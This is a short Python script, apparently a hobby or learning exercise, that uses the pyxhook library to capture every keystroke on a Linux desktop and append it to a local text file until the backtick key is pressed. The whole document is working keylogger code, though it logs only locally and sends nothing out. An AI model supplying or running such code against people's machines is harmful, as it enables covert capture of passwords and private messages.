import pyxhook

log_file = '/home/nick/Desktop/keylog.txt'

def logKeyPress(event):
    logfile = open(log_file, 'a')
    logfile.write(event.Key)
    logfile.write('\n')

    if event.Ascii==96:
        logfile.close()
        key_listener.cancel()

key_listener = pyxhook.HookManager()
key_listener.KeyDown=logKeyPress
key_listener.HookKeyboard()
key_listener.start()
